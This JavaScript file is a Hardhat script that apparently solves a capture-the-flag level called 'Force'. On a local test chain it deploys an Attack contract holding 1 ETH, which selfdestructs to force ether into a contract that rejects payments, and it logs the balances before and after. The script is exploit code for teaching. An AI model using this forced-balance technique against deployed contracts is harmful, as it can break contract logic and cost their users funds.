/*
Some contracts will simply not take your money ¯\_(ツ)_/¯

The goal of this level is to make the balance of the contract greater than zero.

  Things that might help:

Fallback methods
Sometimes the best way to attack a contract is with another contract.
*/

const hre = require("hardhat");
/*
const path = require("path");
require('dotenv').config( {
  path: path.join(__dirname, '.env')
} );

PRIVATE_KEY=process.env.PRIVATE_KEY;
GAS_LIMIT=process.env.GAS_LIMIT;
*/

async function main() {
  // Recreating the attack on ganache
  [macias, deployer] = await ethers.getSigners();

  const Force = await hre.ethers.getContractFactory("Force");
  this.force = await Force.connect(deployer).deploy();
  await this.force.deployed();

  const Attack = await hre.ethers.getContractFactory("Attack");
  this.attack = await Attack.connect(macias).deploy(this.force.address, { value: hre.ethers.utils.parseEther("1") });  // Deploy the Attack contract and filling it up with 1 ETH
  await this.attack.deployed();


  console.log("\n\n Performing attack ... \n\n");

  console.log(
    `
    Force contract ETH Balance before the attack ${await hre.ethers.provider.getBalance(this.force.address)} \n
    `
  );
  
  // Injecting ETH in the Force contract
  console.log("Injecting ETH in the Force contract ...");
  // The Attack contract will be selfdestructed and will send its ETH balance to the Force contract
  const tx = await this.attack.connect(macias).attack();
  
  // Await for the tx to be mined
  console.log("Waiting the ETH balance of the Force contract is manipulated : )");
  let txResult = await tx.wait();

  console.log("transaction " , txResult);

  console.log("===============================================\n===============================================\n");
  console.log("\n\n Results after performing the attack \n\n");

  console.log(
    `
    Force contract ETH Balance after the attack ${await hre.ethers.provider.getBalance(this.force.address)} \n
    `
  );

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});